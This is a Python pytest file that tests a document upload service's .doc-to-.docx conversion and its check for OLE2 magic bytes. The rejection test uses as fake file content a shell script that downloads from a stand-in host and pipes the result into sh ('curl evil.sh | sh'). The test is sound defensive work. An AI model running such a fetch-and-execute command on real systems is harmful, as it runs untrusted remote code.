import pytest
from novamind.features.knowledge_space.services.document_upload_service import DocumentUploadService

pytestmark = pytest.mark.unit

# OLE2 Compound File 魔数（CDFB）：.doc 转换前的有效性校验要求（审计 P2）
OLE2_MAGIC = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"


@pytest.mark.asyncio
async def test_doc_upload_is_normalized_to_docx(monkeypatch):
    service = object.__new__(DocumentUploadService)
    service._get_file_type = DocumentUploadService._get_file_type.__get__(service, DocumentUploadService)
    service.logger = type("L", (), {"info": lambda *args, **kwargs: None})()

    async def _fake_convert(file_content: bytes, filename: str) -> bytes:
        assert filename == "legacy.doc"
        return b"converted-docx"

    monkeypatch.setattr(
        "novamind.features.knowledge_space.services.document_upload_service.convert_doc_to_docx",
        _fake_convert,
    )

    filename, file_content = await DocumentUploadService._normalize_upload_file(
        service, "legacy.doc", OLE2_MAGIC + b"legacy-doc-body"
    )

    assert filename == "legacy.docx"
    assert file_content == b"converted-docx"


@pytest.mark.asyncio
async def test_doc_upload_rejects_non_ole2_content():
    """魔数前置校验：非 OLE2 内容的 .doc 不喂给外部转换器（审计 P2）。"""
    from novamind.features.knowledge_space.exceptions import DocumentConversionError

    service = object.__new__(DocumentUploadService)
    service._get_file_type = DocumentUploadService._get_file_type.__get__(service, DocumentUploadService)

    with pytest.raises(DocumentConversionError, match="OLE2"):
        await DocumentUploadService._normalize_upload_file(
            service, "fake.doc", b"#!/bin/sh\ncurl evil.sh | sh"
        )
